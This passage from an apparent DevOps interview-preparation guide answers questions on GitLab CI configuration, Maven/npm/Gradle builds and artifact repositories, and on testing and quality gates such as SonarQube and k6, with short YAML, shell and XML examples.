    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      changes: [src/**/*]
    - if: $CI_COMMIT_TAG
      when: manual
    - when: never
```

</details>

### Q115. What are workflow rules and how do they prevent duplicate pipelines? 🔴

<details>
<summary><b>Answer</b></summary>

A branch with an open merge request can get two pipelines per push: a branch pipeline and a merge request pipeline. Top-level `workflow:rules` decide whether a pipeline is created at all, so you pick one.

```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never
    - if: $CI_COMMIT_BRANCH
```

This runs MR pipelines for branches with an open MR, and branch pipelines otherwise.

</details>

### Q116. How do artifacts and cache differ in GitLab CI? 🟡

<details>
<summary><b>Answer</b></summary>

**Artifacts** are job outputs uploaded to GitLab, passed to later-stage jobs automatically (or selectively via `dependencies`/`needs: artifacts`) and downloadable from the UI; they expire (`expire_in`). **Cache** is stored by the runner (locally or in S3/GCS) to reuse dependencies between pipelines, keyed by `cache:key`, and is best-effort. Use `cache:key:files: [package-lock.json]` so the cache invalidates when the lockfile changes.

```yaml
test:
  cache:
    key: { files: [package-lock.json] }
    paths: [.npm/]
  artifacts:
    when: always
    paths: [coverage/]
    reports: { junit: junit.xml }
    expire_in: 1 week
```

</details>

### Q117. What does `needs:` do and how does it create a DAG pipeline? 🟡

<details>
<summary><b>Answer</b></summary>

By default a job waits for every job in all earlier stages. `needs: [job_a]` lets a job start as soon as its listed jobs finish, regardless of stage, so independent chains do not wait on each other and pipelines get faster. `needs: []` makes a job start immediately.

```yaml
integration-test:
  stage: test
  needs: [build-api]
  script: ./run-it.sh
```

</details>

### Q118. What are CI/CD variables, and what are the protected, masked and file types? 🟡

<details>
<summary><b>Answer</b></summary>

Variables are set in `.gitlab-ci.yml`, the project/group/instance settings, or via the API, and are exported to the job. **Protected** variables are only exposed to pipelines on protected branches/tags. **Masked** variables are hidden in job logs (value must meet masking rules such as minimum 8 characters). **File** type variables write the value to a temp file and expose its path, which suits kubeconfigs and certificates. Newer option: `Masked and hidden` to hide the value in settings UI as well.

</details>

### Q119. What are predefined CI variables you use regularly? 🟢

<details>
<summary><b>Answer</b></summary>

`CI_COMMIT_SHA`, `CI_COMMIT_SHORT_SHA`, `CI_COMMIT_REF_NAME`, `CI_COMMIT_BRANCH`, `CI_COMMIT_TAG`, `CI_DEFAULT_BRANCH`, `CI_PIPELINE_SOURCE`, `CI_PROJECT_DIR`, `CI_REGISTRY_IMAGE`, `CI_REGISTRY_USER`, `CI_REGISTRY_PASSWORD`, `CI_JOB_TOKEN`, `CI_ENVIRONMENT_NAME`. For example, `$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA` is a natural image tag in GitLab's built-in registry.

</details>

### Q120. How do `include` and `extends` help reuse configuration? 🟡

<details>
<summary><b>Answer</b></summary>

`include` pulls in YAML from local files, other projects, remote URLs or GitLab templates. `extends` makes a job inherit from a hidden job (name starts with a dot), merging keys. Anchors (`&`/`*`) also work within a file.

```yaml
include:
  - project: platform/ci-templates
    ref: v2.1.0
    file: /templates/docker-build.yml
  - template: Security/SAST.gitlab-ci.yml

.deploy-base:
  image: bitnami/kubectl:1.31
  before_script: [kubectl config use-context $KUBE_CONTEXT]

deploy-staging:
  extends: .deploy-base
  script: [kubectl apply -f k8s/]
```

</details>

### Q121. What are GitLab environments and how do deployments get tracked? 🟡

<details>
<summary><b>Answer</b></summary>

A job with the `environment:` keyword creates or updates an environment, recording each deployment with its commit and URL. You get deployment history, one-click rollback (re-run an older deployment job), and optional protected environments requiring approvals. Dynamic environments (review apps) use `environment: name: review/$CI_COMMIT_REF_SLUG` with an `on_stop` job to tear them down.

```yaml
deploy-prod:
  stage: deploy
  script: ./deploy.sh
  environment:
    name: production
    url: https://app.example.com
  when: manual
```

</details>

### Q122. How do you build Docker images in GitLab CI without privileged mode? 🔴

<details>
<summary><b>Answer</b></summary>

Docker-in-Docker (`docker:dind` service) needs a privileged runner, which gives the job near-root on the host. Rootless alternatives that need no daemon: **Kaniko** (archived by Google in 2025, forks exist), **Buildah** (`buildah bud` rootless), or **BuildKit rootless**. Another approach is mounting a remote BuildKit builder or using a dedicated, isolated build runner.

```yaml
build:
  image: quay.io/buildah/stable
  script:
    - buildah bud -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA .
    - buildah push --creds $CI_REGISTRY_USER:$CI_REGISTRY_PASSWORD $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA
```

</details>

### Q123. What is a parent-child pipeline versus a multi-project (downstream) pipeline? 🔴

<details>
<summary><b>Answer</b></summary>

A **parent-child** pipeline runs in the same project: a trigger job includes another YAML file and starts a child pipeline, useful for monorepos or dynamically generated config (a job writes YAML as an artifact, and `trigger:include:artifact` runs it). A **multi-project** pipeline uses `trigger:project:` to start a pipeline in another repo, for cross-service orchestration. Use `strategy: depend` so the trigger job mirrors the downstream status.

```yaml
trigger-payments:
  trigger:
    include: services/payments/.gitlab-ci.yml
    strategy: depend
  rules:
    - changes: [services/payments/**/*]
```

</details>

### Q124. What does `services:` do in a GitLab job? 🟢

<details>
<summary><b>Answer</b></summary>

`services` starts extra containers linked to the job container for the duration of the job, such as PostgreSQL or Redis for integration tests. The service is reachable via its image name as hostname (for example `postgres`), or a custom `alias`.

```yaml
test:
  image: python:3.12
  services:
    - name: postgres:16
      alias: db
  variables:
    POSTGRES_PASSWORD: pw
    DATABASE_URL: postgresql://postgres:pw@db:5432/postgres
  script: pytest
```

</details>

### Q125. How do you control job order within and across stages, and how do `when:` options work? 🟢

<details>
<summary><b>Answer</b></summary>

Stages run in the order defined under `stages:`. `when` options: `on_success` (default), `on_failure`, `always`, `manual`, `delayed` (with `start_in`), and `never`. A manual job can be marked `allow_failure: false` to block the pipeline until someone runs it, whereas manual jobs default to `allow_failure: true`, letting the pipeline continue past them.

</details>

### Q126. What are GitLab CI/CD components and CI/CD Catalog? 🟡

<details>
<summary><b>Answer</b></summary>

CI/CD components are versioned, reusable pipeline units, published from a project's `templates/` directory and consumed with `include: component:`, taking typed `spec:inputs`. The CI/CD Catalog lists published components in an instance. They replace copy-pasting templates and support semantic versions.

```yaml
include:
  - component: gitlab.com/my-group/ci-components/docker-build@1.3.0
    inputs:
      image_name: api
```

</details>

### Q127. How does GitLab handle secrets and external secret managers in jobs? 🔴

<details>
<summary><b>Answer</b></summary>

Simple secrets come from masked and protected CI variables. For stronger security, use the `secrets:` keyword to fetch values at job time from HashiCorp Vault, Azure Key Vault, GCP Secret Manager or AWS Secrets Manager, authenticating with the job's **ID token** (`id_tokens:` with an OIDC JWT) so no long-lived credential is stored in GitLab.

```yaml
deploy:
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.example.com
  secrets:
    DB_PASSWORD:
      vault: prod/db/password@secret
      token: $VAULT_ID_TOKEN
```

</details>

### Q128. What is `CI_JOB_TOKEN` and what can it access? 🟡

<details>
<summary><b>Answer</b></summary>

`CI_JOB_TOKEN` is a short-lived token created per job, valid only while the job runs. It lets the job pull from the project's package/container registries, trigger downstream pipelines and clone dependent repos. Access to **other** projects is controlled by the project's job token allowlist (Settings > CI/CD > Job token permissions), which should be limited to the projects that need it.

</details>

### Q129. What are review apps and how are they implemented? 🟡

<details>
<summary><b>Answer</b></summary>

A review app is a temporary environment deployed per merge request so reviewers can click through the change. You deploy to a dynamic environment name and define a stop job that runs when the MR closes or the branch is deleted.

```yaml
review:
  stage: deploy
  script: ./deploy-review.sh $CI_COMMIT_REF_SLUG
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_COMMIT_REF_SLUG.review.example.com
    on_stop: stop-review
  rules: [{ if: $CI_PIPELINE_SOURCE == "merge_request_event" }]
stop-review:
  stage: deploy
  script: ./teardown-review.sh $CI_COMMIT_REF_SLUG
  environment: { name: review/$CI_COMMIT_REF_SLUG, action: stop }
  when: manual
```

</details>

### Q130. How do you run jobs conditionally on merge requests only? 🟢

<details>
<summary><b>Answer</b></summary>

Use `rules` with `$CI_PIPELINE_SOURCE == "merge_request_event"`. In MR pipelines, extra variables like `CI_MERGE_REQUEST_IID` and `CI_MERGE_REQUEST_TARGET_BRANCH_NAME` are available.

```yaml
lint:
  script: npm run lint
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
```

</details>

### Q131. What is `retry`, `timeout` and `interruptible` in GitLab CI? 🟡

<details>
<summary><b>Answer</b></summary>

`retry: { max: 2, when: [runner_system_failure, stuck_or_timeout_failure] }` re-runs on infrastructure problems only. `timeout: 20 minutes` limits a job (bounded by the runner's maximum). `interruptible: true` marks a job as safe to cancel when a newer pipeline on the same ref starts (with "Auto-cancel redundant pipelines" enabled). Do not mark deploy jobs interruptible.

</details>

### Q132. How do GitLab merge trains work? 🔴

<details>
<summary><b>Answer</b></summary>

A merge train queues MRs; for each MR GitLab creates a temporary merge result that includes the target branch plus all MRs ahead in the train, and runs the pipeline on it. If it passes the MR merges; if an earlier MR fails, later ones are rebuilt without it. Pipelines must be configured for merge request events (`rules` with `merge_request_event`), and "merged results pipelines" must be enabled. The effect is a `main` that is always green without developers constantly rebasing.

</details>

### Q133. What built-in security scanning does GitLab CI offer? 🟡

<details>
<summary><b>Answer</b></summary>

GitLab ships templates for SAST, secret detection, dependency scanning, container scanning, IaC scanning, DAST, and API fuzzing, included with `include: template: Security/SAST.gitlab-ci.yml` and so on. Results appear as reports in the MR widget and vulnerability dashboard (some features need Ultimate). Scan execution policies let security teams enforce scans across projects.

</details>

### Q134. What is the difference between `before_script`, `script` and `after_script`? 🟢

<details>
<summary><b>Answer</b></summary>

`before_script` and `script` are concatenated and run in the same shell, so a failure in either fails the job and variables persist between them. `after_script` runs in a separate shell, after the job even on failure (but not if the job is cancelled or times out hard), so it does not see variables or changes from `script`, though it sees the working directory files. Use it for cleanup and uploading diagnostics.

</details>

### Q135. How does `parallel` and `parallel:matrix` work in GitLab? 🟡

<details>
<summary><b>Answer</b></summary>

`parallel: 5` creates five copies with `CI_NODE_INDEX` and `CI_NODE_TOTAL` set, so a test runner can shard its suite. `parallel:matrix` creates a job per variable combination.

```yaml
test:
  parallel:
    matrix:
      - PYTHON: ['3.11', '3.12']
        DB: [postgres, mysql]
  image: python:$PYTHON
  script: pytest --db $DB
```

</details>

## Build Tools and Artifact Repositories

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q136. What is Maven and what is its build lifecycle? 🟢

<details>
<summary><b>Answer</b></summary>

Maven is a Java build and dependency tool driven by `pom.xml`. The default lifecycle phases are `validate`, `compile`, `test`, `package`, `verify`, `install`, `deploy`. Running a phase runs all earlier ones, so `mvn package` compiles, tests and builds the JAR. `install` copies it to your local `~/.m2` repo; `deploy` pushes it to a remote repository.

```bash
mvn -B clean verify          # CI-friendly: batch mode, no colour/progress noise
```

</details>

### Q137. What is the difference between `mvn package`, `install` and `deploy`? 🟢

<details>
<summary><b>Answer</b></summary>

`package` creates the artifact (JAR/WAR) in `target/`. `install` also copies it to the local repository `~/.m2/repository` so other local projects can depend on it. `deploy` uploads to the remote repository configured in `distributionManagement` (Nexus/Artifactory). In CI you normally run `verify` for PRs and `deploy` only from release builds.

</details>

### Q138. How do Maven dependency scopes and transitive dependencies work? 🟡

<details>
<summary><b>Answer</b></summary>

Scopes: `compile` (default, everywhere), `provided` (needed to compile, supplied at runtime by the container), `runtime`, `test`, `system`, and `import` (for BOMs in `dependencyManagement`). Transitive dependencies are pulled in automatically; conflicts are resolved by "nearest definition wins". Inspect with `mvn dependency:tree` and exclude or manage versions via `<dependencyManagement>`.

```bash
mvn dependency:tree -Dincludes=com.fasterxml.jackson.core
```

</details>

### Q139. What is `settings.xml` in Maven and how do CI builds use it? 🟡

<details>
<summary><b>Answer</b></summary>

`~/.m2/settings.xml` (or `-s file`) holds mirrors, server credentials, proxies and profiles. In CI, define a mirror pointing at your Nexus/Artifactory group repository so all downloads go through the proxy cache, and inject credentials via environment variables rather than committing them.

```xml
<settings>
  <mirrors>
    <mirror>
      <id>central-proxy</id>
      <mirrorOf>*</mirrorOf>
      <url>https://nexus.example.com/repository/maven-public/</url>
    </mirror>
  </mirrors>
  <servers>
    <server>
      <id>releases</id>
      <username>${env.NEXUS_USER}</username>
      <password>${env.NEXUS_PASS}</password>
    </server>
  </servers>
</settings>
```

</details>

### Q140. What is the Maven Wrapper and why use it? 🟢

<details>
<summary><b>Answer</b></summary>

`mvnw` (generated with `mvn wrapper:wrapper`) is a script that downloads the exact Maven version declared in `.mvn/wrapper/maven-wrapper.properties`. It guarantees every developer and CI agent uses the same Maven without pre-installing it. Same idea as `gradlew` for Gradle.

</details>

### Q141. How do you cache dependencies and speed up Maven builds in CI? 🟡

<details>
<summary><b>Answer</b></summary>

Cache `~/.m2/repository` keyed on `pom.xml` hashes, use a mirror proxy, build with `-T 1C` for parallel module builds, skip work you do not need (`-DskipTests` in a package-only job, but never in the test job), and use `-B` batch mode with `-ntp` to suppress download progress logs.

```bash
mvn -B -ntp -T 1C verify
```

</details>

### Q142. What is the difference between `npm install` and `npm ci`? 🟢

<details>
<summary><b>Answer</b></summary>

`npm install` resolves versions using `package.json` and may update `package-lock.json`. `npm ci` requires an existing lockfile, deletes `node_modules`, and installs exactly what the lockfile says; it fails if `package.json` and the lockfile disagree. Use `npm ci` in CI for fast, deterministic, repeatable installs.

```bash
npm ci --prefer-offline --no-audit
```

</details>

### Q143. How do semver ranges in `package.json` (`^`, `~`) behave and why do lockfiles matter? 🟡

<details>
<summary><b>Answer</b></summary>

`^1.4.2` allows any `1.x.x` at or above 1.4.2, `~1.4.2` allows `1.4.x` patches only. Without a lockfile, two builds on different days can resolve different transitive versions. The committed `package-lock.json` pins every version and integrity hash (SHA-512), making installs reproducible and giving a defence against tampered registry packages.

</details>

### Q144. What do `npm run build`, `npm test` and `npm publish` do in a pipeline? 🟢

<details>
<summary><b>Answer</b></summary>

They execute scripts defined in `package.json` `scripts` (`build`, `test`) or publish the package to the configured registry. `npm publish` uses an auth token in `.npmrc` (for CI, `//registry.npmjs.org/:_authToken=${NPM_TOKEN}`), and `--provenance` attaches a signed provenance statement when run from a supported CI such as GitHub Actions with OIDC.

```bash
npm publish --provenance --access public
```

</details>

### Q145. What is Gradle and how does it differ from Maven? 🟡

<details>
<summary><b>Answer</b></summary>

Gradle uses a Groovy or Kotlin DSL (`build.gradle(.kts)`) and a task graph instead of Maven's fixed lifecycle, giving more flexibility. Its big wins are incremental builds, the build cache (local and remote), the Gradle daemon and parallel execution, making large builds much faster. Maven is more convention-driven and simpler to read. For CI use `./gradlew build --no-daemon --build-cache` and enable the `gradle/actions/setup-gradle` cache in GitHub Actions.

</details>

### Q146. What is a Nexus repository (Sonatype Nexus Repository) and what repository types does it have? 🟢

<details>
<summary><b>Answer</b></summary>

Nexus is an artifact manager supporting Maven, npm, PyPI, Docker, NuGet, Helm, raw and others. Three repository types: **hosted** (your own artifacts, e.g., `maven-releases` and `maven-snapshots`), **proxy** (caches a remote such as Maven Central), and **group** (one URL that aggregates hosted and proxy repos). Developers and CI point at the group URL.

</details>

### Q147. Why use an artifact repository instead of just Git or a shared drive? 🟢

<details>
<summary><b>Answer</b></summary>

Binaries do not belong in Git. A repository manager gives versioned, immutable storage, dependency proxying and caching (faster builds and resilience when Maven Central or npm is down), access control, retention policies, metadata and search, vulnerability scanning, and an audit trail of who published what.

</details>

### Q148. What is JFrog Artifactory and how does it compare to Nexus? 🟡

<details>
<summary><b>Answer</b></summary>

Both are universal artifact managers. Artifactory (JFrog) emphasises build info and promotion (`jf rt build-promote`), Xray vulnerability scanning, federated repositories for multi-site replication, and AQL for queries; its OSS edition supports only Maven/Gradle/Ivy-type repos while commercial editions support all package types. Nexus Repository has a free Community Edition with usage limits, with Sonatype IQ for policy and scanning. Pick based on package types needed, HA requirements, scanning integration and cost.

</details>

### Q149. What are Maven SNAPSHOT versus release versions? 🟢

<details>
<summary><b>Answer</b></summary>

A `-SNAPSHOT` version (such as `1.5.0-SNAPSHOT`) is a mutable development build, re-publishable and re-resolved periodically. A release version (`1.5.0`) is immutable: once published, repositories reject overwrites. Release builds should not depend on SNAPSHOTs, since that destroys reproducibility, and Nexus snapshot and release repos have different redeployment policies.

</details>

### Q150. How do you publish a Maven artifact to Nexus from a pipeline? 🟡

<details>
<summary><b>Answer</b></summary>

Configure `distributionManagement` in `pom.xml`, matching `<server>` ids in `settings.xml`, then run `mvn deploy`.

```xml
<distributionManagement>
  <repository>
    <id>releases</id>
    <url>https://nexus.example.com/repository/maven-releases/</url>
  </repository>
  <snapshotRepository>
    <id>snapshots</id>
    <url>https://nexus.example.com/repository/maven-snapshots/</url>
  </snapshotRepository>
</distributionManagement>
```

```bash
mvn -B -s settings.xml deploy -DskipTests
```

Tests should already have run in an earlier stage.

</details>

### Q151. How do you manage container image tags and retention in a registry? 🔴

<details>
<summary><b>Answer</b></summary>

Tag with the commit SHA (immutable) and optionally SemVer tags for releases. Enable **tag immutability** where supported (ECR `imageTagMutability=IMMUTABLE`). Use lifecycle policies to expire untagged and old images, for example keep the last 30 tagged images or anything younger than 90 days, but never delete images referenced by running deployments or production release tags. Scan on push and replicate critical images to a second region.

```bash
aws ecr put-image-tag-mutability --repository-name shop/api --image-tag-mutability IMMUTABLE
```

</details>

### Q152. What is a Maven BOM and when would you use `dependencyManagement`? 🔴

<details>
<summary><b>Answer</b></summary>

A BOM (Bill of Materials) is a POM that only declares managed dependency versions. Importing it with scope `import` in `dependencyManagement` aligns versions for a whole family (Spring Boot, Jackson) so you do not specify them individually and avoid mismatches. `dependencyManagement` in a parent POM centralises versions across modules without forcing the dependency on each.

```xml
<dependencyManagement>
  <dependencies>
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-dependencies</artifactId>
      <version>3.4.1</version>
      <type>pom</type>
      <scope>import</scope>
    </dependency>
  </dependencies>
</dependencyManagement>
```

</details>

### Q153. How does Python packaging fit into a CI pipeline (pip, venv, wheels)? 🟡

<details>
<summary><b>Answer</b></summary>

Create an isolated environment, install pinned dependencies (a `requirements.txt` with hashes via `pip-compile --generate-hashes`, or `poetry.lock` / `uv.lock`), run tests, then build with `python -m build` to get a wheel and sdist, and upload with `twine` or trusted publishing (OIDC to PyPI, no token). `uv` is now commonly used for fast installs.

```bash
python -m venv .venv && . .venv/bin/activate
pip install --require-hashes -r requirements.txt
python -m build && twine check dist/*
```

</details>

### Q154. What is Go's build flow in CI and how does module caching work? 🟡

<details>
<summary><b>Answer</b></summary>

`go mod download` fetches modules into `GOMODCACHE` (`~/go/pkg/mod`), verified against `go.sum`. `go build` caches compiled packages in `GOCACHE`. Cache both keyed on `go.sum`. Static binaries for containers: `CGO_ENABLED=0 GOOS=linux go build -trimpath -ldflags="-s -w" -o app ./cmd/app`, then copy into a distroless or scratch image.

</details>

### Q155. What is a multi-stage Docker build and why is it a CI best practice? 🟡

<details>
<summary><b>Answer</b></summary>

A multi-stage Dockerfile uses a builder stage with compilers and dev dependencies, then copies only the built output into a minimal runtime stage. The final image is smaller, has a smaller attack surface, and does not contain source or build tools.

```dockerfile
FROM maven:3.9-eclipse-temurin-21 AS build
WORKDIR /src
COPY pom.xml .
RUN mvn -B -ntp dependency:go-offline
COPY src ./src
RUN mvn -B -ntp -DskipTests package

FROM eclipse-temurin:21-jre-alpine
COPY --from=build /src/target/app.jar /app/app.jar
USER 10001
ENTRYPOINT ["java","-jar","/app/app.jar"]
```

</details>

### Q156. What are Docker layer caching strategies in CI? 🔴

<details>
<summary><b>Answer</b></summary>

Fresh runners have empty Docker caches, so you must export and import the cache. With BuildKit: `--cache-to/--cache-from type=registry,ref=...:buildcache,mode=max` stores layers in a registry (works anywhere), `type=gha` uses the GitHub cache, and `type=local` uses a directory you cache yourself. Order the Dockerfile so rarely changing layers (dependency manifests and install) come before frequently changing ones (source copy).

```bash
docker buildx build \
  --cache-from type=registry,ref=registry.example.com/api:buildcache \
  --cache-to type=registry,ref=registry.example.com/api:buildcache,mode=max \
  -t registry.example.com/api:$GIT_SHA --push .
```

</details>

### Q157. What is a semantic version bump and how can pipelines automate it? 🟡

<details>
<summary><b>Answer</b></summary>

SemVer is `MAJOR.MINOR.PATCH`: breaking change, backward-compatible feature, backward-compatible fix. With Conventional Commits (`feat:`, `fix:`, `feat!:`), tools like `semantic-release`, `release-please` or `git-cliff` read commit history, decide the bump, create the tag, changelog and GitHub release automatically from the pipeline on `main`.

</details>

### Q158. What are Helm charts as artifacts and how are they published? 🟡

<details>
<summary><b>Answer</b></summary>

A Helm chart is a versioned package (`.tgz`) of Kubernetes templates. Modern practice is to push charts to an **OCI registry** (ECR, GHCR, Harbor, Artifactory) rather than a classic index.yaml HTTP repo.

```bash
helm lint ./chart
helm package ./chart --version 1.4.0 --app-version $GIT_SHA
helm push api-1.4.0.tgz oci://ghcr.io/my-org/charts
helm install api oci://ghcr.io/my-org/charts/api --version 1.4.0
```

</details>

### Q159. What is a proxy (remote) repository and what is dependency confusion? 🔴

<details>
<summary><b>Answer</b></summary>

A proxy repo caches an upstream registry. **Dependency confusion** is an attack where someone publishes a public package with the same name as your private internal package and a higher version, tricking resolvers that check public sources into pulling it. Mitigations: use scoped names (`@org/pkg`), configure the resolver so internal namespaces resolve only from the private repo (Nexus/Artifactory routing rules, npm scope registry mapping, pip `--index-url` instead of `--extra-index-url`), and reserve your names on public registries.

```ini
# .npmrc
@acme:registry=https://nexus.example.com/repository/npm-private/
```

</details>

### Q160. What is the difference between a build tool, a package manager and a CI server? 🟢

<details>
<summary><b>Answer</b></summary>

A **build tool** (Maven, Gradle, Make, Bazel) turns source into artifacts by following a defined build process. A **package manager** (npm, pip, Cargo) resolves and installs dependencies (Maven and npm blur the line by doing both). A **CI server** (Jenkins, GitHub Actions, GitLab CI) orchestrates when and where those tools run, plus reporting and gating.

</details>

## Testing and Quality Gates

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q161. What is the testing pyramid? 🟢

<details>
<summary><b>Answer</b></summary>

The pyramid is a guide for balancing automated tests: many fast, isolated **unit tests** at the base; fewer **integration tests** (a service with real DB or message broker) in the middle; and a small number of slow, brittle **end-to-end/UI tests** at the top. The shape keeps feedback fast and cost low, because failures at lower layers are cheaper to find and debug.

</details>

### Q162. What is the difference between unit, integration, and end-to-end tests? 🟢

<details>
<summary><b>Answer</b></summary>

**Unit** tests check a single function or class in isolation with dependencies mocked, running in milliseconds. **Integration** tests check that components work together, for example the service and a real PostgreSQL container (Testcontainers). **E2E** tests drive the whole system through the UI or public API in a deployed environment (Playwright, Cypress, k6). Each answers a different question and catches different bugs.

</details>

### Q163. What are smoke tests and sanity tests in a deployment pipeline? 🟡

<details>
<summary><b>Answer</b></summary>

**Smoke tests** are a minimal set of checks right after deploy to confirm the application is up and its critical paths work (health endpoint returns 200, login works, a basic read and write succeeds). **Sanity tests** are a narrow check that a specific fix or feature behaves as intended. Failing smoke tests should trigger an automatic rollback.

```bash
curl -fsS --retry 10 --retry-delay 3 --retry-connrefused https://api.example.com/healthz
```

</details>

### Q164. What is code coverage and is a high percentage a good target? 🟡

<details>
<summary><b>Answer</b></summary>

Coverage measures which lines or branches were executed by tests (JaCoCo for Java, `coverage.py`, Istanbul/nyc, `go test -cover`). It shows what is untested, not whether the tests are meaningful: a test with no assertions gives coverage. We gate on **coverage of new code** (for example, 80% on changed lines) rather than a global number, and combine it with mutation testing (PIT, Stryker) on critical modules.

</details>

### Q165. What is a quality gate in SonarQube? 🟡

<details>
<summary><b>Answer</b></summary>

A quality gate is a set of pass/fail conditions evaluated after a scan. The default "Sonar way" gate applies to **new code**: no new bugs, vulnerabilities, or security hotspots unreviewed, coverage on new code at least 80%, duplications on new code at most 3%, and maintainability rating A. If the gate fails, the pipeline should fail, so the PR cannot merge.

</details>

### Q166. How do you integrate SonarQube into a CI pipeline and make it block on gate failure? 🟡

<details>
<summary><b>Answer</b></summary>

Run the scanner with the server URL and a token, then wait for the gate result. For Maven: `mvn sonar:sonar`. For generic scanning use `sonar-scanner` with `-Dsonar.qualitygate.wait=true`, which makes the scanner block and exit non-zero when the gate fails. In Jenkins, `waitForQualityGate abortPipeline: true` after `withSonarQubeEnv` does the same via a webhook.

```bash
sonar-scanner \
  -Dsonar.projectKey=shop-api \
  -Dsonar.host.url=https://sonar.example.com \
  -Dsonar.token=$SONAR_TOKEN \
  -Dsonar.qualitygate.wait=true
```

</details>

### Q167. What does SonarQube's "Clean as You Code" and new code period mean? 🔴

<details>
<summary><b>Answer</b></summary>

Instead of demanding a team fix thousands of legacy issues at once, Clean as You Code applies the quality gate only to code changed since a reference point (the **new code period**: previous version, number of days, a specific date, or a reference branch). Legacy debt stays visible but does not block, while no new debt is introduced. For PR decoration the new code is the diff against the target branch. Configure the reference branch for long-lived branches so new code is measured correctly, and make sure the checkout has full history (`fetch-depth: 0`) so blame data is available.

</details>

### Q168. What types of issues does static analysis find: bugs, vulnerabilities, code smells, security hotspots? 🟢

<details>
<summary><b>Answer</b></summary>

**Bugs**: code that is likely wrong (null dereference, resource leak). **Vulnerabilities**: exploitable security flaws (SQL injection, hard-coded credentials). **Security hotspots**: security-sensitive code that needs human review to decide whether it is safe. **Code smells**: maintainability problems (dead code, high cognitive complexity, duplication). SAST tools read source without running it.

</details>

### Q169. What is the difference between SAST, DAST, SCA and IAST? 🟡

<details>
<summary><b>Answer</b></summary>

- **SAST** scans source or bytecode for flaws (Semgrep, SonarQube, CodeQL).
- **SCA** scans third-party dependencies for known CVEs and licence issues (Dependabot, Trivy, Snyk, OWASP Dependency-Check).
- **DAST** attacks a running application from outside (OWASP ZAP).
- **IAST** instruments the running app during tests to observe flows from inside.

A pipeline typically runs SAST, SCA and secret scanning on every PR and DAST against a staging deployment.

</details>

### Q170. What are flaky tests and how should a pipeline deal with them? 🟡

<details>
<summary><b>Answer</b></summary>

A flaky test passes and fails on the same code, usually due to timing, shared state, test order, external dependencies or time-of-day assumptions. Blanket retries hide the problem and slow the pipeline. Better: detect flakes by tracking pass/fail per test over time, quarantine them into a non-blocking suite with an owner and deadline, fix root causes (fake clocks, isolated data, Testcontainers instead of shared DBs), and report flake rate as a metric.

</details>

### Q171. How do you publish test results in Jenkins, GitHub Actions and GitLab? 🟡

<details>
<summary><b>Answer</b></summary>

All consume JUnit XML. Jenkins: `junit 'target/surefire-reports/*.xml'`. GitLab: `artifacts: reports: junit: report.xml` shows results in the MR. GitHub Actions has no native test tab; use a reporter action (such as `dorny/test-reporter`) or write a summary to `$GITHUB_STEP_SUMMARY`, and upload the XML as an artifact.

</details>

### Q172. What is contract testing and when does it beat integration tests? 🔴

<details>
<summary><b>Answer</b></summary>

Contract testing (Pact, Spring Cloud Contract) verifies that a service consumer and provider agree on the API shape without deploying both. The consumer test generates a contract; the provider pipeline verifies it can satisfy all consumer contracts, and a broker tracks compatibility (`can-i-deploy`). It beats full integration environments in microservice estates because tests are fast, deterministic and run in each service's own pipeline.

```bash
pact-broker can-i-deploy --pacticipant orders --version $GIT_SHA --to-environment production
```

</details>

### Q173. What are Testcontainers and why do they improve CI tests? 🟡

<details>
<summary><b>Answer</b></summary>

Testcontainers is a library (Java, Go, Python, Node, .NET) that starts throwaway Docker containers (PostgreSQL, Kafka, Redis, LocalStack) from inside the test code and tears them down after. Tests run against real dependencies instead of mocks or a shared test database, with isolated, reproducible state. The CI runner needs access to a Docker daemon (or a compatible remote one).

</details>

### Q174. How do you shard and parallelise a long test suite? 🔴

<details>
<summary><b>Answer</b></summary>

Split tests across N runners using timing data so shards finish around the same time, rather than splitting by file count. Playwright has `--shard=1/4`, Jest has `--shard`, pytest uses `pytest-xdist` (`-n auto`) within a machine and `pytest-split` across machines, GitLab uses `parallel:` with `CI_NODE_INDEX`. Ensure tests are isolated (no shared database rows), merge coverage and JUnit reports from all shards afterwards.

```yaml
strategy:
  matrix: { shard: [1, 2, 3, 4] }
steps:
  - run: npx playwright test --shard=${{ matrix.shard }}/4
```

</details>

### Q175. What is a quality gate beyond SonarQube (examples)? 🟡

<details>
<summary><b>Answer</b></summary>

Any automated pass/fail criterion that blocks promotion: failing unit tests, coverage on new code, no critical/high CVEs (`trivy image --exit-code 1 --severity CRITICAL,HIGH`), licence policy check, IaC policy (OPA/Conftest, Checkov), performance budget (k6 thresholds, Lighthouse CI), API breaking-change check, and required code review. Gates are only useful if they are fast, deterministic and owned by someone.

</details>

### Q176. What is linting and formatting enforcement in CI? 🟢

<details>
<summary><b>Answer</b></summary>

Linters check style and common mistakes (ESLint, flake8/ruff, golangci-lint, hadolint for Dockerfiles, yamllint, actionlint for workflows). Formatters (Prettier, black, gofmt) normalise formatting. CI runs them in check mode (`prettier --check`, `black --check`) so a PR fails when files are not formatted, while pre-commit hooks fix them locally.

</details>

### Q177. How are performance and load tests used as pipeline gates? 🔴

<details>
<summary><b>Answer</b></summary>

After deploying to a production-like environment, run a short load test with pass/fail thresholds so regressions fail the pipeline. With k6, thresholds make the process exit non-zero.

```javascript
export const options = {
  vus: 50, duration: '2m',
  thresholds: {
    http_req_failed: ['rate<0.01'],
    http_req_duration: ['p(95)<400'],
  },
};
```

Run full-scale soak tests nightly rather than on every commit, and compare results against a baseline to detect trends instead of single-run noise.

</details>

